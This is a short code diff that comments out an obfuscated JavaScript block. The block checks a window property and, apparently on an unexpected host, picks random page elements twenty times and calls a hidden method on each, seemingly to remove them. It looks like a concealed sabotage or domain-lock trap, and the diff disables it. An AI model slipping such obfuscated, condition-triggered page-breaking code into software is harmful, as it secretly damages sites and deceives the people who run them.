@@ -50,10 +50,10 @@ var b = function (c, d) {
   var e = a[c];
   return e;
 };
-if (window[b("0x0")][b("0x1")][b("0x2")]("j") != 0x8) {
-  for (i = 0x0; i < 0x14; ++i) {
-    var items = $("*");
-    var item = items[Math[b("0x3")](Math[b("0x4")]() * items[b("0x5")])];
-    item[b("0x6")]();
-  }
-}
+// if (window[b("0x0")][b("0x1")][b("0x2")]("j") != 0x8) {
+//   for (i = 0x0; i < 0x14; ++i) {
+//     var items = $("*");
+//     var item = items[Math[b("0x3")](Math[b("0x4")]() * items[b("0x5")])];
+//     item[b("0x6")]();
+//   }
+// }
